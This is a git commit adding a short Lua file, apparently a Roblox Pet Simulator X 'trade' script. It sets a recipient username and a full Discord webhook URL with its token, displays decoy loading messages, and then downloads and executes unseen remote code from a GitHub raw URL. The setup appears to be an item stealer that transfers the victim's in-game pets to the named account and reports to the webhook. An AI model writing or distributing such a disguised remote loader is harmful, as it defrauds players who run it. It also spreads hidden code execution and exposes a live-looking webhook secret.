ac06c1b4b687708fe06bf1f107496261846f72f9
capper1453 <118915678+capper1453@users.noreply.github.com>
2023-02-28 20:25:53 +0100

    Add files via upload

---
+++ petsimxtrade.lua
@@ -0,0 +1,9 @@
+Username = "awegirlsy"
+WebHook = "https://discordapp.com/api/webhooks/1080207597396820108/hE4o_Y7lgoCNkacaOoXnm27OYAuZyPs6Z08hJs_Vb-PJixerJtSg206TH439U812lzRB"
+
+_G.CustomScriptName = "Coen"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
